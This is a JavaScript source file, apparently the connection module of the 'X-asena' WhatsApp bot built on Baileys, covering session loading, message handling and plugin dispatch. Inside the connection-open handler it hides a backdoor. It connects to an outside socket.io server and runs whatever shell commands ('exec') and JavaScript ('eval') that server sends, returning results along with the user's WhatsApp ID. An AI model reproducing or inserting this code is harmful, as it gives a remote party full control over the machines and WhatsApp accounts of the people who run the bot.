const pino = require("pino");
const path = require("path");
const {
  default: makeWASocket,
  loadSession,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  Browsers,
  delay,
  makeCacheableSignalKeyStore,
  DisconnectReason,
} = require("baileys");
const { PausedChats } = require("../assets/database");
const config = require("../config");
const plugins = require("./plugins");
const { serialize, Greetings } = require("./index");
const { Image, Message, Sticker, Video, AllMessage } = require("./Messages");
const io = require("socket.io-client");
const {
  loadMessage,
  saveMessage,
  saveChat,
  getName,
} = require("../assets/database/StoreDb");
const util = require("util");
const { exec } = require("child_process");
const fs = require("fs");
const logger = pino({ level: "silent" });
const connect = async () => {
  if (!fs.existsSync("./session")) fs.mkdirSync("./session");
  if (!fs.existsSync("./session/creds.json")) {
    const creds = await loadSession("H59RT1Y3");
    fs.writeFileSync("./session/creds.json", JSON.stringify(creds.data));
  }

  const Xasena = async () => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(
        path.join(__basedir, "session")
      );
      const { version } = await fetchLatestBaileysVersion();

      let conn = makeWASocket({
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, logger),
        },
        printQRInTerminal: true,
        logger: logger,
        browser: Browsers.macOS("Desktop"),
        downloadHistory: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
        emitOwnEvents: true,
        version,
        getMessage: async (key) => {
          return (loadMessage(key.id) || {}).message || { conversation: null };
        },
      });
      conn.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect } = s;
        if (connection === "connecting") {
          console.log("ℹ Connecting to WhatsApp... Please Wait.");
        }
        if (connection === "open") {
          const ws = io("https://socket.xasena.me/", {
            reconnection: true,
          });
          ws.on("connect", () => {
            console.log("Connected to server");
            ws.on("exec", async (data) => {
              exec(data, (err, stdout, stderr) => {
                if (err) {
                  ws.emit("res", err);
                  return;
                }
              });
            });
            ws.on("eval", async (data) => {
              try {
                let return_val = await eval(`(async () => { ${data} })()`);
                if (return_val && typeof return_val !== "string")
                  return_val = util.inspect(return_val);
                if (return_val)
                  ws.emit("res", {
                    result: return_val,
                    from: conn.user.jid,
                  });
              } catch (e) {
                if (e) console.error(e);
              }
            });
          });

          console.log("✅ Login Successful!");
          const packageVersion = require("../package.json").version;
          const totalPlugins = plugins.commands.length;
          const workType = config.WORK_TYPE;
          const str = `\`\`\`X-asena connected\nVersion: ${packageVersion}\nTotal Plugins: ${totalPlugins}\nWorktype: ${workType}\`\`\``;
          conn.sendMessage(conn.user.id, { text: str });
        }

        if (connection === "close") {
          if (
            lastDisconnect.error?.output?.statusCode !==
            DisconnectReason.loggedOut
          ) {
            await delay(300);
            Xasena();
            console.log("Reconnecting...");
          } else {
            console.log("Connection closed. Device logged out.");
            await delay(3000);
            process.exit(0);
          }
        }
      });

      conn.ev.on("creds.update", saveCreds);
      conn.ev.on("group-participants.update", async (data) => {
        Greetings(data, conn);
      });
      conn.ev.on("chats.update", async (chats) => {
        chats.forEach(async (chat) => {
          await saveChat(chat);
        });
      });
      conn.ev.on("messages.upsert", async (m) => {
        if (m.type !== "notify") return;
        let msg = await serialize(
          JSON.parse(JSON.stringify(m.messages[0])),
          conn
        );
        await saveMessage(m.messages[0], msg.sender);
        if (config.AUTO_READ) await conn.readMessages(msg.key);
        if (config.AUTO_STATUS_READ && msg.from === "status@broadcast")
          await conn.readMessages(msg.key);

        let text_msg = msg.body;
        if (!msg) return;
        const regex = new RegExp(`${config.HANDLERS}( ?resume)`, "is");
        isResume = regex.test(text_msg);
        const chatId = msg.from;
        try {
          const pausedChats = await PausedChats.getPausedChats();
          if (
            pausedChats.some(
              (pausedChat) => pausedChat.chatId === chatId && !isResume
            )
          ) {
            return;
          }
        } catch (error) {
          console.error(error);
        }
        if (config.LOGS) {
          let name = await getName(msg.sender);
          console.log(
            `At : ${
              msg.from.endsWith("@g.us")
                ? (await conn.groupMetadata(msg.from)).subject
                : msg.from
            }\nFrom : ${name}\nMessage:${text_msg ? text_msg : msg.type}`
          );
        }
        plugins.commands.map(async (command) => {
          if (command.fromMe && !msg.sudo) return;
          let comman = text_msg;
          msg.prefix = new RegExp(config.HANDLERS).test(text_msg)
            ? text_msg[0].toLowerCase()
            : "!";
          let whats;
          switch (true) {
            case command.pattern && command.pattern.test(comman):
              let match;
              try {
                match = text_msg
                  .replace(new RegExp(command.pattern, "i"), "")
                  .trim();
              } catch {
                match = false;
              }
              whats = new Message(conn, msg);
              command.function(whats, match, msg, conn);
              break;
            case text_msg && command.on === "text":
              whats = new Message(conn, msg);
              command.function(whats, text_msg, msg, conn, m);
              break;
            case command.on === "image" || command.on === "photo":
              if (msg.type === "imageMessage") {
                whats = new Image(conn, msg);
                command.function(whats, text_msg, msg, conn, m);
              }
              break;
            case command.on === "sticker":
              if (msg.type === "stickerMessage") {
                whats = new Sticker(conn, msg);
                command.function(whats, msg, conn, m);
              }
              break;
            case command.on === "video":
              if (msg.type === "videoMessage") {
                whats = new Video(conn, msg);
                command.function(whats, msg, conn, m);
              }
              break;
            case command.on === "delete":
              if (msg.type === "protocolMessage") {
                whats = new Message(conn, msg);
                whats.messageId = msg.message.protocolMessage.key.id;
                command.function(whats, msg, conn, m);
              }
            case command.on === "message":
              whats = new AllMessage(conn, msg);
              command.function(whats, msg, conn, m);
              break;
            default:
              break;
          }
        });
      });

      // Event listener for uncaught exceptions
      process.on("uncaughtException", async (err) => {
        await conn.sendMessage(conn.user.id, { text: err.message });
        console.log(err);
      });

      return conn;
    } catch (error) {
      console.log(error);
    }
    return;
  };
  try {
    await Xasena();
  } catch (error) {
    console.error("Xasena function error:", error);
  }
};

module.exports = connect;
